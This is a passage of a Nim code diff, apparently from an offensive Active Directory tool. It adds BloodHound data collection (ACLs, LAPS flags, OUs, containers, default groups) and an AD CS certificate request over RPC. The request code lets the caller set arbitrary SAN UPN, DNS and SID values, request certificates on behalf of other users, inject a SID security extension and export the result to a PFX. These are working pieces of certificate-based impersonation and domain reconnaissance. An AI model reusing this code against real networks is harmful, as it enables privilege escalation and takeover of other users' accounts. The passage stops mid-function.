+  of "gpos":
+    node["ObjectIdentifier"] = %bloodhoundGuidObjectId(entry, node["ObjectIdentifier"].getStr())
+    node["IsACLProtected"] = %true
+    if node.hasKey("Links"): node.delete("Links")
+    if props.hasKey("displayname"): props.delete("displayname")
+    if props.hasKey("enabled"): props.delete("enabled")
+    props["gpcpath"] = %firstAttr(entry, "gPCFileSysPath").toUpperAscii()
+    props["description"] = %firstAttr(entry, "description")
+    props["whencreated"] = %generalizedTimeUnix(entry, "whenCreated")
+  of "ous":
+    if props.hasKey("enabled"): props.delete("enabled")
+    node["ObjectIdentifier"] = %bloodhoundGuidObjectId(entry, entry.dn)
+    node["IsACLProtected"] = %false
+    node["Links"] = newJArray()
+    node["ChildObjects"] = newJArray()
+    node["GPOChanges"] = %*{
+      "AffectedComputers": [],
+      "DcomUsers": [],
+      "LocalAdmins": [],
+      "PSRemoteUsers": [],
+      "RemoteDesktopUsers": []
+    }
+    props["blocksinheritance"] = %(firstAttr(entry, "gPOptions") == "1")
+    props["description"] = nullableAttr(entry, "description")
+    props["whencreated"] = %generalizedTimeUnix(entry, "whenCreated")
+  of "containers":
+    if props.hasKey("enabled"): props.delete("enabled")
+    node["ObjectIdentifier"] = %bloodhoundGuidObjectId(entry, entry.dn)
+    node["IsACLProtected"] = %false
+    node["ChildObjects"] = newJArray()
+    props["description"] = %firstAttr(entry, "description")
+    props["whencreated"] = %generalizedTimeUnix(entry, "whenCreated")
   else:
     discard
+  node["Aces"] = bloodhoundLegacyAces(node{"Aces"})
 
 proc validateBloodhoundFileJson(path, expectedKind: string; doc: JsonNode): JsonNode =
   var errors = newJArray()
@@ -4180,7 +4705,8 @@ proc validateBloodhoundFileJson(path, expectedKind: string; doc: JsonNode): Json
     addError("missing meta object")
   else:
     let meta = doc["meta"]
-    if not meta.hasKey("methods") or meta["methods"].kind notin {JInt, JFloat}:
+    if expectedKind != "domains" and
+        (not meta.hasKey("methods") or meta["methods"].kind notin {JInt, JFloat}):
       addError("meta.methods is missing or non-numeric")
     if not meta.hasKey("type") or meta["type"].getStr() != expectedKind:
       addError("meta.type does not match " & expectedKind)
@@ -4207,8 +4733,12 @@ proc validateBloodhoundFileJson(path, expectedKind: string; doc: JsonNode): Json
   result = %*{"file": path, "type": expectedKind, "valid": errors.len == 0,
     "errors": errors}
 
+proc bloodhoundPrincipalTypes(domainName, domainSid: string;
+                              users, groups, computers: seq[ldapclient.LdapEntry]):
+                              Table[string, string]
+
 proc writeBloodhoundFiles(outPath, domainName, baseDn, domainSid, funcLevel: string;
-                          users, groups, computers, trusts, gpos: seq[ldapclient.LdapEntry];
+                          users, groups, computers, trusts, gpos, ous, containers: seq[ldapclient.LdapEntry];
                           acesByDn: Table[string, JsonNode];
                           legacy = false): JsonNode =
   var root = outPath
@@ -4228,56 +4758,99 @@ proc writeBloodhoundFiles(outPath, domainName, baseDn, domainSid, funcLevel: str
     "Properties": {
       "name": domainUpper,
       "domain": domainUpper,
+      "domainsid": domainSid,
       "distinguishedname": baseDn,
-      "functionallevel": funcLevel
+      "description": "",
+      "functionallevel": funcLevel,
+      "highvalue": true,
+      "whencreated": 0
     },
-    "Aces": if dnKey(baseDn) in acesByDn: acesByDn[dnKey(baseDn)] else: newJArray(),
+    "Aces": if dnKey(baseDn) in acesByDn:
+        (if legacy: bloodhoundLegacyAces(acesByDn[dnKey(baseDn)]) else: acesByDn[dnKey(baseDn)])
+      else: newJArray(),
     "Links": [],
     "ChildObjects": [],
-    "Trusts": []
+    "Trusts": [],
+    "GPOChanges": {
+      "AffectedComputers": [],
+      "DcomUsers": [],
+      "LocalAdmins": [],
+      "PSRemoteUsers": [],
+      "RemoteDesktopUsers": []
+    },
+    "IsDeleted": false,
+    "IsACLProtected": false
   }
   let refsByDn = bloodhoundDnRefs(users, groups, computers, gpos)
   let groupMembersByDn = bloodhoundGroupMembers(users, groups, computers, refsByDn)
+  let principalTypes = bloodhoundPrincipalTypes(domainName, domainSid, users, groups, computers)
   var usersData = newJArray()
+  if legacy:
+    usersData.add bloodhoundDefaultUser(domainName, domainSid)
   for entry in users:
     let node = bloodhoundNode(entry, "users", domainName, acesByDn)
     if legacy:
-      applyBloodhoundLegacyNodeFixups(node, "users", entry, refsByDn, groupMembersByDn)
+      applyBloodhoundLegacyNodeFixups(node, "users", domainName, domainSid, entry, refsByDn, groupMembersByDn)
+      addBloodhoundLegacyGmsaAces(node, entry, domainName, principalTypes)
     usersData.add node
   var groupsData = newJArray()
+  if legacy:
+    groupsData.add bloodhoundDefaultGroup(domainName, domainSid, "S-1-5-9",
+      "Enterprise Domain Controllers", bloodhoundEnterpriseDcMembers(computers))
+    groupsData.add bloodhoundDefaultGroup(domainName, domainSid, "S-1-1-0", "Everyone")
+    groupsData.add bloodhoundDefaultGroup(domainName, domainSid, "S-1-5-11", "Authenticated Users")
+    groupsData.add bloodhoundDefaultGroup(domainName, domainSid, "S-1-5-4", "Interactive")
   for entry in groups:
     let node = bloodhoundNode(entry, "groups", domainName, acesByDn)
     if legacy:
-      applyBloodhoundLegacyNodeFixups(node, "groups", entry, refsByDn, groupMembersByDn)
+      applyBloodhoundLegacyNodeFixups(node, "groups", domainName, domainSid, entry, refsByDn, groupMembersByDn)
     groupsData.add node
   var computersData = newJArray()
   for entry in computers:
     let node = bloodhoundNode(entry, "computers", domainName, acesByDn)
     if legacy:
-      applyBloodhoundLegacyNodeFixups(node, "computers", entry, refsByDn, groupMembersByDn)
+      applyBloodhoundLegacyNodeFixups(node, "computers", domainName, domainSid, entry, refsByDn, groupMembersByDn)
     computersData.add node
   var gposData = newJArray()
   for entry in gpos:
     let node = bloodhoundNode(entry, "gpos", domainName, acesByDn)
     if legacy:
-      applyBloodhoundLegacyNodeFixups(node, "gpos", entry, refsByDn, groupMembersByDn)
+      applyBloodhoundLegacyNodeFixups(node, "gpos", domainName, domainSid, entry, refsByDn, groupMembersByDn)
     gposData.add node
+  var ousData = newJArray()
+  for entry in ous:
+    let node = bloodhoundNode(entry, "ous", domainName, acesByDn)
+    if legacy:
+      applyBloodhoundLegacyNodeFixups(node, "ous", domainName, domainSid, entry, refsByDn, groupMembersByDn)
+    ousData.add node
+  var containersData = newJArray()
+  for entry in containers:
+    if legacy and bloodhoundLegacyFilteredContainer(entry.dn):
+      continue
+    let node = bloodhoundNode(entry, "containers", domainName, acesByDn)
+    if legacy:
+      applyBloodhoundLegacyNodeFixups(node, "containers", domainName, domainSid, entry, refsByDn, groupMembersByDn)
+    containersData.add node
   var trustsData = newJArray()
-  for entry in trusts: trustsData.add bloodhoundTrustNode(entry, domainName)
+  for entry in trusts:
+    trustsData.add bloodhoundTrustNode(entry, domainName)
+    if legacy and domains.len > 0:
+      domains[0]["Trusts"].add bloodhoundLegacyTrustNode(entry)
 
   let prefix = if legacy: now().format("yyyyMMddHHmmss") & "_" else: ""
   let files =
     if legacy:
-      [
+      @[
         (prefix & "domains.json", bloodhoundLegacyFileJson("domains", domains)),
         (prefix & "users.json", bloodhoundLegacyFileJson("users", usersData)),
         (prefix & "groups.json", bloodhoundLegacyFileJson("groups", groupsData)),
         (prefix & "computers.json", bloodhoundLegacyFileJson("computers", computersData)),
         (prefix & "gpos.json", bloodhoundLegacyFileJson("gpos", gposData)),
-        (prefix & "trusts.json", bloodhoundLegacyFileJson("trusts", trustsData))
+        (prefix & "ous.json", bloodhoundLegacyFileJson("ous", ousData)),
+        (prefix & "containers.json", bloodhoundLegacyFileJson("containers", containersData))
       ]
     else:
-      [
+      @[
         ("domains.json", bloodhoundFileJson("domains", domains)),
         ("users.json", bloodhoundFileJson("users", usersData)),
         ("groups.json", bloodhoundFileJson("groups", groupsData)),
@@ -4299,7 +4872,7 @@ proc writeBloodhoundFiles(outPath, domainName, baseDn, domainSid, funcLevel: str
       break
   result = %*{"path": root, "files": written, "zipped": false,
     "validation": validation, "valid": valid,
-    "format": if legacy: "bloodhound-legacy-4" else: "bloodhound-ce"}
+    "format": if legacy: "bloodhound-python-legacy-5" else: "bloodhound-ce"}
   if wantZip:
     let parent = parentDir(zipPath)
     if parent.len > 0:
@@ -4312,11 +4885,18 @@ proc writeBloodhoundFiles(outPath, domainName, baseDn, domainSid, funcLevel: str
       result["zip_error"] = %zipped.output
     result["valid"] = %(valid and zipped.exitCode == 0)
 
-proc bloodhoundPrincipalTypes(domainSid: string;
+proc bloodhoundPrincipalTypes(domainName, domainSid: string;
                               users, groups, computers: seq[ldapclient.LdapEntry]):
                               Table[string, string] =
   if domainSid.len > 0:
     result[domainSid] = "Domain"
+  let domainUpper = domainName.toUpperAscii()
+  for sid in ["S-1-1-0", "S-1-5-4", "S-1-5-9", "S-1-5-11",
+      "S-1-5-32-544", "S-1-5-32-545", "S-1-5-32-548", "S-1-5-32-549",
+      "S-1-5-32-550", "S-1-5-32-551", "S-1-5-32-552", "S-1-5-32-554",
+      "S-1-5-32-560", "S-1-5-32-568", "S-1-5-32-574"]:
+    result[domainUpper & "-" & sid] = "Group"
+  result[domainUpper & "-S-1-5-17"] = "User"
   for entry in users:
     let sid = bloodhoundObjectId(entry, "")
     if sid.len > 0: result[sid] = "User"
@@ -4327,33 +4907,44 @@ proc bloodhoundPrincipalTypes(domainSid: string;
     let sid = bloodhoundObjectId(entry, "")
     if sid.len > 0: result[sid] = "Computer"
 
-proc collectBloodhoundAclMap(host: string; config: CliConfig; baseDn, domainSid: string;
-                             users, groups, computers, gpos: seq[ldapclient.LdapEntry]):
+proc collectBloodhoundAclMap(host: string; config: CliConfig; baseDn, domainName, domainSid: string;
+                             users, groups, computers, gpos, ous,
+                             containers: seq[ldapclient.LdapEntry]):
                              Future[Table[string, JsonNode]] {.async.} =
-  let principalTypes = bloodhoundPrincipalTypes(domainSid, users, groups, computers)
-  var targets: seq[string]
+  let principalTypes = bloodhoundPrincipalTypes(domainName, domainSid, users, groups, computers)
+  var targets: seq[tuple[dn: string; entryType: string; hasLaps: bool]]
   if baseDn.len > 0:
-    targets.add baseDn
+    targets.add (baseDn, "domain", false)
   for entry in users:
-    if entry.dn.len > 0: targets.add entry.dn
+    if entry.dn.len > 0: targets.add (entry.dn, "user", false)
   for entry in groups:
-    if entry.dn.len > 0: targets.add entry.dn
+    if entry.dn.len > 0: targets.add (entry.dn, "group", false)
   for entry in computers:
-    if entry.dn.len > 0: targets.add entry.dn
+    if entry.dn.len > 0:
+      let hasLaps = firstAttr(entry, "ms-Mcs-AdmPwd").len > 0 or
+        firstAttr(entry, "ms-Mcs-AdmPwdExpirationTime").len > 0 or
+        firstAttr(entry, "msLAPS-PasswordExpirationTime").len > 0
+      targets.add (entry.dn, "computer", hasLaps)
   for entry in gpos:
-    if entry.dn.len > 0: targets.add entry.dn
+    if entry.dn.len > 0: targets.add (entry.dn, "gpo", false)
+  for entry in ous:
+    if entry.dn.len > 0: targets.add (entry.dn, "organizational-unit", false)
+  for entry in containers:
+    if entry.dn.len > 0 and not bloodhoundLegacyFilteredContainer(entry.dn):
+      targets.add (entry.dn, "container", false)
   var seen: Table[string, bool]
   for target in targets:
-    let key = dnKey(target)
+    let key = dnKey(target.dn)
     if key.len == 0 or key in seen:
       continue
     seen[key] = true
     let acl = await ldapclient.aclForObject(
       host, config.port, max(config.timeoutMs, 5000),
       config.username, config.password, config.ntlmHash, config.domain,
-      target, kerberos=config.kerberos)
+      target.dn, kerberos=config.kerberos)
     if acl.success:
-      result[key] = bloodhoundAces(acl, principalTypes)
+      result[key] = bloodhoundAces(acl, domainName, target.entryType,
+        target.hasLaps, principalTypes)
 
 proc randomComputerPassword(): string =
   const Alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#%^*-_=+"
@@ -5335,10 +5926,11 @@ proc findAdcsRequestId(body: string): string =
       if result.len > 0: return
 
 proc pemWrap(label, raw: string): string
+proc writePkcs12FromPemFiles(certPath, keyPath, pfxPath, password: string): bool
 proc fetchAdcsCaDer(host: string; port: int; timeoutMs: int;
                     username, password, domain, ntlmHash, caName: string;
                     kerberos: bool): Future[string] {.async.}
-proc generateAdcsCsr(config: CliConfig): tuple[keyPath, csrPath, subject, csrDer: string; ok: bool; output: string]
+proc generateAdcsCsr(config: CliConfig; includeRequestExtensions = true): tuple[keyPath, csrPath, subject, csrDer: string; ok: bool; output: string]
 
 type
   EvpPkey {.importc: "EVP_PKEY", header: "<openssl/evp.h>".} = object
@@ -5353,6 +5945,9 @@ type
   BioMethod {.importc: "BIO_METHOD", header: "<openssl/bio.h>".} = object
   X509ReqObj {.importc: "X509_REQ", header: "<openssl/x509.h>".} = object
   Pkcs7Obj {.importc: "PKCS7", header: "<openssl/pkcs7.h>".} = object
+  Pkcs12Obj {.importc: "PKCS12", header: "<openssl/pkcs12.h>".} = object
+  Asn1Object {.importc: "ASN1_OBJECT", header: "<openssl/asn1.h>".} = object
+  Asn1OctetString {.importc: "ASN1_OCTET_STRING", header: "<openssl/asn1.h>".} = object
 
 proc EVP_RSA_gen(bits: cuint): ptr EvpPkey {.importc, header: "<openssl/rsa.h>".}
 proc EVP_PKEY_free(key: ptr EvpPkey) {.importc, header: "<openssl/evp.h>".}
@@ -5377,7 +5972,14 @@ proc X509V3_set_ctx_nodb(ctx: ptr X509v3Ctx) {.importc, header: "<openssl/x509v3
 proc X509V3_EXT_conf_nid(conf: pointer; ctx: ptr X509v3Ctx; ext_nid: cint;
                           value: cstring): ptr X509ExtObj {.importc, header: "<openssl/x509v3.h>".}
 proc X509_add_ext(x: ptr X509Obj; ex: ptr X509ExtObj; loc: cint): cint {.importc, header: "<openssl/x509.h>".}
+proc X509_EXTENSION_create_by_OBJ(ex: ptr ptr X509ExtObj; obj: ptr Asn1Object;
+                                  crit: cint; data: ptr Asn1OctetString): ptr X509ExtObj {.importc, header: "<openssl/x509.h>".}
 proc X509_EXTENSION_free(a: ptr X509ExtObj) {.importc, header: "<openssl/x509.h>".}
+proc OBJ_txt2obj(s: cstring; no_name: cint): ptr Asn1Object {.importc, header: "<openssl/objects.h>".}
+proc ASN1_OBJECT_free(a: ptr Asn1Object) {.importc, header: "<openssl/asn1.h>".}
+proc ASN1_OCTET_STRING_new(): ptr Asn1OctetString {.importc, header: "<openssl/asn1.h>".}
+proc ASN1_OCTET_STRING_free(a: ptr Asn1OctetString) {.importc, header: "<openssl/asn1.h>".}
+proc ASN1_OCTET_STRING_set(str: ptr Asn1OctetString; data: pointer; len: cint): cint {.importc, header: "<openssl/asn1.h>".}
 proc BIO_new(typ: ptr BioMethod): ptr BioObj {.importc, header: "<openssl/bio.h>".}
 proc BIO_s_mem(): ptr BioMethod {.importc, header: "<openssl/bio.h>".}
 proc BIO_free(a: ptr BioObj): cint {.importc, header: "<openssl/bio.h>".}
@@ -5404,6 +6006,10 @@ proc PKCS7_sign(signcert: ptr X509Obj; pkey: ptr EvpPkey; certs: pointer;
                 data: ptr BioObj; flags: cint): ptr Pkcs7Obj {.importc, header: "<openssl/pkcs7.h>".}
 proc PKCS7_free(p7: ptr Pkcs7Obj) {.importc, header: "<openssl/pkcs7.h>".}
 proc i2d_PKCS7(a: ptr Pkcs7Obj; pp: ptr ptr byte): cint {.importc, header: "<openssl/pkcs7.h>".}
+proc PKCS12_create(pass, name: cstring; pkey: ptr EvpPkey; cert: ptr X509Obj;
+                   ca: pointer; nidKey, nidCert, iter, macIter, keytype: cint): ptr Pkcs12Obj {.importc, header: "<openssl/pkcs12.h>".}
+proc i2d_PKCS12(a: ptr Pkcs12Obj; pp: ptr ptr byte): cint {.importc, header: "<openssl/pkcs12.h>".}
+proc PKCS12_free(p12: ptr Pkcs12Obj) {.importc, header: "<openssl/pkcs12.h>".}
 proc BIO_new_mem_buf(buf: pointer; len: cint): ptr BioObj {.importc, header: "<openssl/bio.h>".}
 proc BIO_new_file(filename: cstring; mode: cstring): ptr BioObj {.importc, header: "<openssl/bio.h>".}
 proc PEM_read_bio_X509(bp: ptr BioObj; x: ptr ptr X509Obj; cb: pointer; u: pointer): ptr X509Obj {.importc, header: "<openssl/pem.h>".}
@@ -5425,14 +6031,27 @@ const
     byte 0x20, 0x60, 0xae, 0x91, 0x3c, 0x9e, 0xcf, 0x11,
          0x8d, 0x7c, 0x00, 0xaa, 0x00, 0xc0, 0x91, 0xbe
   ]
+  ICertRequestDUuid = [
+    byte 0x70, 0x6e, 0x9e, 0xd9, 0x88, 0xfc, 0xd0, 0x11,
+         0xb4, 0x98, 0x00, 0xa0, 0xc9, 0x03, 0x12, 0xf3
+  ]
+  CLSIDCertRequestD = [
+    byte 0x74, 0x6e, 0x9e, 0xd9, 0x88, 0xfc, 0xd0, 0x11,
+         0xb4, 0x98, 0x00, 0xa0, 0xc9, 0x03, 0x12, 0xf3
+  ]
   CrDispIssued = 0x00000003'u32
   CrDispUnderSubmission = 0x00000005'u32
+  CrInPkcs10Binary = 0x00000102'u32
 
 proc adcsAddU32Le(data: var string; value: uint32) =
   data.add char(int(value and 0xff))
   data.add char(int((value shr 8) and 0xff))
   data.add char(int((value shr 16) and 0xff))
   data.add char(int((value shr 24) and 0xff))
+
+proc adcsAddU16Le(data: var string; value: uint16) =
+  data.add char(int(value and 0xff))
+  data.add char(int((value shr 8) and 0xff))
 
 proc adcsReadU32Le(data: string; offset: int): uint32 =
   if offset + 3 >= data.len:
@@ -5445,6 +6064,20 @@ proc adcsReadU32Le(data: string; offset: int): uint32 =
 proc adcsPad4(data: var string) =
   while data.len mod 4 != 0:
     data.add char(0)
+
+proc adcsBytesToStr(b: openArray[byte]): string =
+  result = newString(b.len)
+  for i, x in b:
+    result[i] = chr(int(x))
+
+proc adcsAddOrpcThis(d: var string) =
+  d.adcsAddU16Le 5
+  d.adcsAddU16Le 7
+  d.adcsAddU32Le 0
+  d.adcsAddU32Le 0
+  for _ in 0 ..< 16:
+    d.add char(0)
+  d.adcsAddU32Le 0
 
 proc adcsDecodeUtf16Le(raw: string): string =
   var i = 0
@@ -5483,6 +6116,61 @@ proc adcsBuildCertTransBlob(data: string; referent: uint32): string =
   result.add data
   result.adcsPad4()
 
+proc certAdminAuthorityString(ca: string): string =
+  let clean = ca.strip()
+  let slash = clean.rfind("\\")
+  if slash >= 0 and slash + 1 < clean.len:
+    return clean[slash + 1 .. ^1]
+  clean
+
+proc adcsBuildRequestDStub(authority, attributes, requestDer: string;
+                           dwFlags: uint32 = CrInPkcs10Binary): string =
+  result.adcsAddU32Le dwFlags
+  result.add adcsBuildUniqueWString(authority, 0x00020000'u32)
+  result.adcsAddU32Le 0'u32
+  result.add adcsBuildUniqueWString(attributes, 0x00020004'u32)
+  result.add adcsBuildCertTransBlob(requestDer, 0x00020008'u32)
+
+proc adcsBuildDcomRequestDStub(authority, attributes, requestDer: string;
+                               dwFlags: uint32 = CrInPkcs10Binary): string =
+  result.adcsAddOrpcThis()
+  result.add adcsBuildRequestDStub(authority, attributes, requestDer, dwFlags)
+
+proc adcsOutputPrefix(outPath: string): string =
+  let clean = outPath.strip()
+  if clean.len == 0:
+    return ""
+  for ext in [".pfx", ".p12", ".cer", ".crt", ".pem", ".csr", ".key"]:
+    if clean.toLowerAscii().endsWith(ext):
+      return clean[0 ..< clean.len - ext.len]
+  clean
+
+proc adcsSafeOutputName(value: string): string =
+  let clean = value.strip()
+  for ch in clean:
+    if ch.isAlphaNumeric or ch in {'-', '_', '.'}:
+      result.add ch
+    elif ch == '$':
+      discard
+    else:
+      result.add '_'
+  result = result.strip(chars = {'_', '.', '-'})
+  if result.len == 0:
+    result = "certificate"
+
+proc adcsDefaultOutputPrefix(config: CliConfig): string =
+  if config.ldapAdcsOut.len > 0:
+    return adcsOutputPrefix(config.ldapAdcsOut)
+  if config.ldapAdcsUpn.len > 0:
+    let at = config.ldapAdcsUpn.find('@')
+    if at > 0:
+      return adcsSafeOutputName(config.ldapAdcsUpn[0 ..< at])
+    return adcsSafeOutputName(config.ldapAdcsUpn)
+  if config.ldapAdcsDns.len > 0:
+    return adcsSafeOutputName(config.ldapAdcsDns)
+  if config.username.len > 0:
+    return adcsSafeOutputName(config.username)
+  "certificate"
 
 proc wrapCsrPkcs7(csrDer, certFile, keyFile: string): string =
   let certBio = BIO_new_file(certFile.cstring, "r")
@@ -5543,18 +6231,23 @@ proc ldapAdcsRpcRequestJson(host: string; config: CliConfig): Future[JsonNode] {
     return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
       "host": host, "success": false,
       "message": "--adcs-request requires --ca and --template"}
-  let csr = generateAdcsCsr(config)
+  let csr = generateAdcsCsr(config, includeRequestExtensions = false)
   if not csr.ok:
     return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
       "host": host, "success": false, "message": "CSR generation failed",
       "output": csr.output}
   var requestDer = csr.csrDer
-  var icprFlags = 0'u32
+  var requestFlags = 0'u32
   var attrib = "CertificateTemplate:" & config.ldapAdcsTemplate
+  var sanParts: seq[string] = @[]
   if config.ldapAdcsUpn.len > 0:
-    attrib.add "\nSAN:upn=" & config.ldapAdcsUpn
+    sanParts.add "upn=" & config.ldapAdcsUpn
   if config.ldapAdcsDns.len > 0:
-    attrib.add "\nSAN:dns=" & config.ldapAdcsDns
+    sanParts.add "dns=" & config.ldapAdcsDns
+  if config.ldapAdcsSid.len > 0:
+    sanParts.add "url=tag:microsoft.com,2022-09-14:sid:" & config.ldapAdcsSid
+  if sanParts.len > 0:
+    attrib.add "\nSAN:" & sanParts.join("&")
   if config.ldapAdcsOnBehalfOf.len > 0:
     let obo = config.ldapAdcsOnBehalfOf
     let requester =
@@ -5566,87 +6259,160 @@ proc ldapAdcsRpcRequestJson(host: string; config: CliConfig): Future[JsonNode] {
       let p7der = wrapCsrPkcs7(requestDer, config.ldapCertFile, config.ldapAdcsKey)
       if p7der.len > 0:
         requestDer = p7der
-        icprFlags = 0x302'u32
+        requestFlags = 0x302'u32
+  let caAuthority = certAdminAuthorityString(config.ldapAdcsCa)
   let credential = smbclient.SmbCredential(
     username: config.username, password: config.password,
     ntlmHash: config.ntlmHash, domain: config.domain,
     ccache: config.ccachePath, krb5Config: config.krb5ConfigPath)
   let authMethod = if config.kerberos: smbclient.samKerberos else: smbclient.samNtlm
-  let session = await smbclient.establishSmbSession(host, 445, max(config.timeoutMs, 8000),
+  let rpcTimeoutMs = max(config.timeoutMs, 30000)
+  var callStub = ""
+  let session = await smbclient.establishSmbSession(host, 445, rpcTimeoutMs,
     credential, authMethod)
   if session == nil or not session.authenticated:
-    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
+    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc-ncacn_np",
       "host": host, "success": false,
       "message": if session == nil: "no SMB session" else: session.message}
   let pipe = await session.ctx.openSmbPipe("cert")
   if not pipe.opened:
     asyncnet.close(session.ctx.socket)
-    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
+    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc-ncacn_np",
       "host": host, "success": false,
       "message": "could not open \\\\PIPE\\\\cert", "status": "0x" & pipe.status.toHex(8)}
   var bindOk = false
   var callRes: smbclient.DceRpcCallResult
+  let icprStub = adcsBuildIcprStub(caAuthority, attrib, requestDer, requestFlags)
   if config.kerberos:
     let bound = await session.ctx.rpcBindPipeKerb(pipe, @ICertPassageUuid, 0'u16, 0'u16,
-      host, config.domain)
+      host, config.domain, ccache = config.ccachePath, krb5Config = config.krb5ConfigPath)
     bindOk = bound.info.bound
     if bindOk:
       callRes = await session.ctx.rpcCallExKerbSealed(pipe, bound.sealCtx, 0'u16,
-        adcsBuildIcprStub(config.ldapAdcsCa, attrib, requestDer, icprFlags), 2'u32)
+        icprStub, 2'u32)
   else:
     let bound = await session.ctx.rpcBindPipeNtlm(pipe, @ICertPassageUuid, 0'u16, 0'u16,
       credential)
     bindOk = bound.info.bound
     if bindOk:
       callRes = await session.ctx.rpcCallExSealed(pipe, bound.sealCtx, 0'u16,
-        adcsBuildIcprStub(config.ldapAdcsCa, attrib, requestDer, icprFlags), 2'u32)
+        icprStub, 2'u32)
   if not bindOk:
     asyncnet.close(session.ctx.socket)
-    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
+    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc-ncacn_np",
       "host": host, "success": false, "message": "ICPR bind failed"}
   asyncnet.close(session.ctx.socket)
   if callRes.packetType == 3'u8:
-    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
+    return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc-ncacn_np",
       "host": host, "success": false, "fault_status": "0x" & callRes.faultStatus.toHex(8),
       "message": "ICPR request faulted"}
+  callStub = callRes.stub
   var off = 0
-  let requestId = adcsReadU32Le(callRes.stub, off); off += 4
-  let disposition = adcsReadU32Le(callRes.stub, off); off += 4
-  let certChain = adcsParseCertTransBlob(callRes.stub, off)
-  let encodedCert = adcsParseCertTransBlob(callRes.stub, off)
-  let dispositionMessage = adcsParseCertTransBlob(callRes.stub, off)
+  let requestId = adcsReadU32Le(callStub, off); off += 4
+  let disposition = adcsReadU32Le(callStub, off); off += 4
+  let certChain = adcsParseCertTransBlob(callStub, off)
+  let encodedCert = adcsParseCertTransBlob(callStub, off)
+  let dispositionMessage = adcsParseCertTransBlob(callStub, off)
   let returnCode =
-    if off + 4 <= callRes.stub.len: adcsReadU32Le(callRes.stub, off)
+    if off + 4 <= callStub.len: adcsReadU32Le(callStub, off)
     else: 0xffffffff'u32
   var certPath = ""
   var caPemPath = ""
+  var pfxPath = ""
+  var pfxOk = false
   if encodedCert.len > 0:
-    certPath = (if config.ldapAdcsOut.len > 0: config.ldapAdcsOut else: csr.csrPath) & ".cer"
+    let artifactPrefix = adcsDefaultOutputPrefix(config)
+    certPath = artifactPrefix & ".cer"
     writeFile(certPath, pemWrap("CERTIFICATE", encodedCert))
+    pfxPath =
+      if config.ldapAdcsOut.toLowerAscii().endsWith(".pfx") or
+          config.ldapAdcsOut.toLowerAscii().endsWith(".p12"):
+        config.ldapAdcsOut
+      else:
+        artifactPrefix & ".pfx"
+    pfxOk = writePkcs12FromPemFiles(certPath, csr.keyPath, pfxPath, "")
     let caDer = await fetchAdcsCaDer(host, if config.port > 0: config.port else: 389,
       max(config.timeoutMs, 5000), config.username, config.password,
-      config.domain, config.ntlmHash, config.ldapAdcsCa, config.kerberos)
+      config.domain, config.ntlmHash, caAuthority, config.kerberos)
     if caDer.len > 0:
-      caPemPath = (if config.ldapAdcsOut.len > 0: config.ldapAdcsOut else: csr.csrPath) & ".ca.pem"
+      caPemPath = artifactPrefix & ".ca.pem"
       writeFile(caPemPath, pemWrap("CERTIFICATE", caDer))
   let dispText = adcsDecodeUtf16Le(dispositionMessage)
-  return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc",
+  return %*{"protocol": "ldap", "operation": "adcs-request", "transport": "rpc-ncacn_np",
     "host": host, "success": returnCode == 0'u32 and disposition == CrDispIssued and encodedCert.len > 0,
     "return_code": "0x" & returnCode.toHex(8), "request_id": requestId,
     "disposition": "0x" & disposition.toHex(8), "ca": config.ldapAdcsCa,
+    "authority": caAuthority, "request_flags": "0x" & requestFlags.toHex(8),
     "template": config.ldapAdcsTemplate, "on_behalf_of": config.ldapAdcsOnBehalfOf,
     "key": csr.keyPath, "csr": csr.csrPath,
-    "cert": certPath, "ca_pem": caPemPath,
+    "cert": certPath, "pfx": if pfxOk: pfxPath else: "", "ca_pem": caPemPath,
     "cert_chain_len": certChain.len, "cert_len": encodedCert.len,
     "message": if dispText.len > 0: dispText
       elif disposition == CrDispIssued: "certificate issued"
       elif disposition == CrDispUnderSubmission: "request is pending"
       else: "ICPR request completed"}
 
-proc generateAdcsCsr(config: CliConfig): tuple[keyPath, csrPath, subject, csrDer: string; ok: bool; output: string] =
-  let prefix =
-    if config.ldapAdcsOut.len > 0: config.ldapAdcsOut
-    else: getTempDir() / ("nimux-adcs-" & $getCurrentProcessId())
+proc derLen(n: int): string =
+  if n < 0x80:
+    result.add char(n)
+  elif n <= 0xff:
+    result.add char(0x81)
+    result.add char(n)
+  else:
+    result.add char(0x82)
+    result.add char((n shr 8) and 0xff)
+    result.add char(n and 0xff)
+
+proc derTlv(tag: byte; content: string): string =
+  result.add char(tag)
+  result.add derLen(content.len)
+  result.add content
+
+proc sidStringToBinary(sid: string): string =
+  let parts = sid.strip().split('-')
+  if parts.len < 4 or parts[0].toUpperAscii() != "S":
+    raise newException(ValueError, "SID must look like S-1-5-21-...")
+  let revision = parseInt(parts[1])
+  if revision < 0 or revision > 255:
+    raise newException(ValueError, "SID revision out of range")
+  let identAuth = parseBiggestUInt(parts[2])
+  if identAuth > 0xffffffffffff'u64:
+    raise newException(ValueError, "SID identifier authority out of range")
+  let subCount = parts.len - 3
+  if subCount < 1 or subCount > 15:
+    raise newException(ValueError, "SID subauthority count out of range")
+  result.add char(revision)
+  result.add char(subCount)
+  for shift in countdown(40, 0, 8):
+    result.add char((identAuth shr shift) and 0xff)
+  for i in 3 ..< parts.len:
+    let sub = parseBiggestUInt(parts[i])
+    if sub > 0xffffffff'u64:
+      raise newException(ValueError, "SID subauthority out of range")
+    result.adcsAddU32Le uint32(sub)
+
+proc buildNtdsSidSecurityExtValue(sid: string): string =
+  let sidBytes = sidStringToBinary(sid)
+  let objectSidOid = "\x06\x0b\x2b\x06\x01\x04\x01\x82\x37\x19\x02\x01"
+  let octets = derTlv(0x04'u8, sidBytes)
+  result = derTlv(0x30'u8, objectSidOid & octets)
+
+proc makeNtdsSidSecurityExtension(sid: string): ptr X509ExtObj =
+  let value = buildNtdsSidSecurityExtValue(sid)
+  let obj = OBJ_txt2obj("1.3.6.1.4.1.311.25.2", 1)
+  if obj == nil:
+    return nil
